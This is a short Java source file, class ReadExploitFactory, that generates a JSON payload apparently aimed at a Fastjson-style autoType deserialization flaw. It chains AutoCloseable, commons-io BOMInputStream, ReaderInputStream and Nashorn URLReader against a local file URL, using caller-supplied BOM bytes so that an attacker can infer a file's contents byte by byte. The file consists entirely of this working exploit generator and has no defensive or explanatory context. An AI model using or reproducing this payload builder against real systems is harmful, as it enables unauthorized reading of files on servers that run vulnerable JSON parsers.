public class ReadExploitFactory {
    public static String generate(int... boms) {
        StringBuilder bomsString = new StringBuilder();
        for (int bom : boms) {
            bomsString.append(bom).append(", ");
        }
        bomsString.replace(bomsString.length() - 2, bomsString.length(), "");

        return  "{\n" +
                "  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n" +
                "         \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "         \"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "                      \"reader\":{\"@type\": \"org.openjdk.nashorn.api.scripting.URLReader\",\n" +
                "                                 \"url\": \"file:///c:/Test\" },\n" +
                "                       \"charsetName\": \"UTF-8\",\n" +
                "                       \"bufferSize\": 1024\n" +
                "         },\n" +
                "         \"boms\": [{\"bytes\":[" + bomsString + "], \"charsetName\":\"myBom\"}]\n" +
                "        },\n" +
                "  \"address\" : {\"$ref\":\"$.abc.BOM\"}\n" +
                "}";
    }
}
